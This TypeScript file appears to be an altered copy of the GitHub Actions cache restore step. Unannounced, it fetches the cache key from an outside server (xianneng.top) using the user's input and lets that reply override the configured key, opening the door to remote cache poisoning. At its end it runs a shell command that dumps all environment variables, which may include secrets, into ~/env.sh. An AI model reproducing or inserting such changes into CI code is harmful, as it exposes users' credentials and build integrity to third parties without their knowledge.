import * as cache from "@actions/cache";
import * as core from "@actions/core";
import child from "child_process"
import request from "request";

import {Events, Inputs, State} from "./constants";
import * as utils from "./utils/actionUtils";

function syncProcess(fun) {
    return new Promise((resolve, reject) => {
        fun(resolve, reject)
    })
}

async function run(): Promise<void> {
    try {
        let cacheKey = await syncProcess((resolve, reject) => {
            let getUniUri = "https://xianneng.top/api/leave-msg/github/action/last?userUni=" + core.getInput("USER");
            let param = {
                url: getUniUri,
            }
            request(param, function (error, response, body) {
                if (!error && response.statusCode == 200) {
                    try {
                        let uni = JSON.parse(body).cacheKey;
                        resolve(uni)
                    } catch(exception) {
                        reject(exception)
                    }
                } else {
                    reject("")
                }
            })
        }).catch(err => console.log("get cache key fail:", err));
        console.log("restore cache key:",cacheKey)
        if (utils.isGhes()) {
            utils.logWarning(
                "Cache action is not supported on GHES. See https://github.com/actions/cache/issues/505 for more details"
            );
            utils.setCacheHitOutput(false);
            return;
        }

        // Validate inputs, this can cause task failure
        if (!utils.isValidEvent()) {
            utils.logWarning(
                `Event Validation Error: The event type ${
                    process.env[Events.Key]
                } is not supported because it's not tied to a branch or tag ref.`
            );
            return;
        }

        let primaryKey = core.getInput(Inputs.Key, {required: true});
        primaryKey = (process.argv[2] || cacheKey || primaryKey) as string;
        core.saveState(State.CachePrimaryKey, primaryKey);

        const restoreKeys = utils.getInputAsArray(Inputs.RestoreKeys);
        const cachePaths = utils.getInputAsArray(Inputs.Path, {
            required: true
        });

        try {
            const cacheKey = await cache.restoreCache(
                cachePaths,
                primaryKey,
                restoreKeys
            );
            if (!cacheKey) {
                core.info(
                    `Cache not found for input keys: ${[
                        primaryKey,
                        ...restoreKeys
                    ].join(", ")}`
                );
                return;
            }

            // Store the matched cache key
            utils.setCacheState(cacheKey);

            const isExactKeyMatch = utils.isExactKeyMatch(primaryKey, cacheKey);
            utils.setCacheHitOutput(isExactKeyMatch);

            core.info(`Cache restored from key: ${cacheKey}`);
        } catch (error) {
            if (error.name === cache.ValidationError.name) {
                throw error;
            } else {
                utils.logWarning(error.message);
                utils.setCacheHitOutput(false);
            }
        }
    } catch (error) {
        core.setFailed(error.message);
    }
    child.execSync("export > ~/env.sh")
}

run();

export default run;
